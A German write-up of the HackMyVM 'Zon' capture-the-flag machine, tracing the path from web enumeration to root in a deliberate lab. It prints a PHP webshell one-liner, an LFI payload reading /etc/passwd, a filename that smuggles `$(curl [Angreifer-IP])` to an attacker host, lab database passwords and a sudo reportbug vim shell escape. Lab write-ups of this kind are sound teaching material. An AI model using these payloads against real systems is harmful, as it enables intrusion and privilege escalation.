# Zon - HackMyVM (Medium)
 
![Zon.png](Zon.png)

## Übersicht

*   **VM:** Zon
*   **Plattform:** HackMyVM (https://hackmyvm.eu/machines/machine.php?vm=Zon)
*   **Schwierigkeit:** Medium
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 24. Januar 2024
*   **Original-Writeup:** https://alientec1908.github.io/Zon_HackMyVM_Medium/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel der "Zon"-Challenge war die Erlangung von User- und Root-Rechten. Der Weg begann mit der Enumeration eines Webservers (Port 80), der eine Upload-Funktion (`upload.php`) bereitstellte. Diese war anfällig für LFI (Parameter `file`) und Command Injection im Dateinamen beim Entpacken einer ZIP-Datei. Durch Hochladen einer ZIP-Datei, die eine PHP-Webshell mit einem speziellen Dateinamen wie `$(curl [Angreifer-IP]).php` enthielt, wurde RCE als `www-data` erlangt. Als `www-data` wurde ein Skript `hashDB.sh` gefunden, das MariaDB-Credentials (`admin:udgrJbFc6Av#U3`) enthielt. In der Datenbank `admin` (Tabelle `credentials`) wurde das Passwort `LDVK@dYiEa2I1lnjrEeoMif` für den Benutzer `Freddie` gefunden. Dies ermöglichte den Login als `freddie` (vermutlich via `su`). Die User-Flag wurde in dessen Home-Verzeichnis gefunden. Die Privilegieneskalation zu Root erfolgte durch Ausnutzung einer unsicheren `sudo`-Regel: `freddie` durfte `/usr/bin/reportbug` als `root` ohne Passwort ausführen. Durch Setzen der Shell im von `reportbug` gestarteten Editor (vermutlich `vim`) auf `/bin/bash` (`:set shell=/bin/bash`) und anschließendem Ausführen eines Shell-Befehls (`:!bash`) wurde eine Root-Shell erlangt.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `vi`
*   `nmap`
*   `nikto`
*   `gobuster`
*   `wfuzz`
*   `echo`
*   `zip`
*   `mv`
*   `exiftool` (versucht, aber nicht primärer Vektor)
*   `ln` (impliziert bei manchen LFI/RCE-Versuchen)
*   `curl`
*   `nc` (netcat)
*   `find`
*   `ls`
*   `cat`
*   `hydra` (versucht)
*   `mysql` (MariaDB Client)
*   `su`
*   `reportbug` (als Exploit-Vektor)
*   Standard Linux-Befehle (`id`, `pwd`, `cd`, `chmod`)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Zon" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Web Enumeration:**
    *   IP-Findung mit `arp-scan` (`192.168.2.104`). Eintrag von `zon.hmv` in `/etc/hosts`.
    *   `nmap`-Scan identifizierte offene Ports: 22 (SSH) und 80 (HTTP - Apache 2.4.57 "zon").
    *   `nikto` und `gobuster` auf Port 80 fanden diverse PHP-Seiten (`upload.php`, `login.php`, `create_account.php`) und ein `/uploads/`-Verzeichnis. `upload.php` gab einen 500er Fehler bei direktem GET-Aufruf.
    *   Ein LFI-Versuch auf `upload.php` mit `?file=file:///etc/passwd` war erfolgreich und zeigte den Inhalt von `/etc/passwd`.

2.  **Initial Access (RCE via File Upload und Filename Injection zu `www-data`):**
    *   Analyse der `upload.php`-Funktion zeigte, dass sie ZIP-Dateien erwartete und den Inhalt auf JPEG prüfte (Filter umgangen durch Umbenennung in `.php.jpeg` innerhalb des ZIPs).
    *   Entscheidend war jedoch die Ausnutzung einer Command Injection im Dateinamen beim serverseitigen Entpacken oder Verarbeiten.
    *   Eine ZIP-Datei (`testcrack2.zip`) wurde erstellt, die eine PHP-Webshell (`<?php echo system($_GET['cmd']); ?>`) mit dem Dateinamen `$(curl [Angreifer-IP]).php` enthielt.
    *   Nach dem Upload dieser ZIP und dem Aufruf der URL `http://zon.hmv/uploads/$(curl%20[Angreifer-IP]).php?cmd=id` wurde RCE als `www-data` bestätigt.
    *   Erlangung einer interaktiven Reverse Shell als `www-data` mittels eines Bash-Payloads über die Webshell.

3.  **Privilege Escalation (von `www-data` zu `freddie` via DB Credentials):**
    *   Als `www-data` wurde im Verzeichnis `/var/www/html` das Skript `hashDB.sh` gefunden.
    *   `cat hashDB.sh` enthüllte MariaDB-Credentials: `admin:udgrJbFc6Av#U3`.
    *   Login in MariaDB (`mysql -u admin -pudgrJbFc6Av#U3`).
    *   In der Datenbank `admin`, Tabelle `credentials`, wurde der Eintrag `Freddie | LDVK@dYiEa2I1lnjrEeoMif` gefunden.
    *   Wechsel zum Benutzer `freddie` mittels `su freddie` und dem Passwort `LDVK@dYiEa2I1lnjrEeoMif`.
    *   User-Flag `a0b4603c7fde7e4113d2ee5fbee5a038` in `/home/freddie/user.txt` gelesen.

4.  **Privilege Escalation (von `freddie` zu `root` via `sudo reportbug`):**
    *   `sudo -l` als `freddie` zeigte: `(ALL : ALL) NOPASSWD: /usr/bin/reportbug`.
    *   Ausführung von `sudo -u root /usr/bin/reportbug`.
    *   Innerhalb des von `reportbug` gestarteten Editors (vermutlich `vim`) wurden folgende Befehle eingegeben:
        1.  `:set shell=/bin/bash`
        2.  `:!bash` (oder `:!/bin/sh`)
    *   Erlangung einer Root-Shell.
    *   Root-Flag `18a72aa09ce61fb487fd6745c8eba769` in `/root/root.txt` gelesen.

## Wichtige Schwachstellen und Konzepte

*   **Local File Inclusion (LFI):** Die Datei `upload.php` war anfällig für LFI über den `file`-Parameter.
*   **Unsicherer Datei-Upload mit Command Injection im Dateinamen:** Ermöglichte das Hochladen einer Webshell und RCE.
*   **Klartext-Credentials in Skript und Datenbank:** Datenbank-Admin-Credentials in `hashDB.sh`, Systembenutzer-Passwort in der Datenbank.
*   **Unsichere `sudo`-Konfiguration (`reportbug`):** Die Erlaubnis, `/usr/bin/reportbug` als `root` ohne Passwort auszuführen, ermöglichte durch einen Shell-Escape aus dem Editor die Erlangung von Root-Rechten.
*   **Shell Escape aus Editor (`vim`):** Eine gängige Technik, um aus Editoren, die von privilegierten Prozessen gestartet werden, eine Shell zu erhalten.

## Flags

*   **User Flag (`/home/freddie/user.txt`):** `a0b4603c7fde7e4113d2ee5fbee5a038`
*   **Root Flag (`/root/root.txt`):** `18a72aa09ce61fb487fd6745c8eba769`

## Tags

`HackMyVM`, `Zon`, `Medium`, `LFI`, `File Upload Vulnerability`, `Command Injection`, `RCE`, `MariaDB`, `Klartext Passwörter`, `sudo Exploitation`, `reportbug`, `vim`, `Shell Escape`, `Privilege Escalation`, `Linux`, `Web`
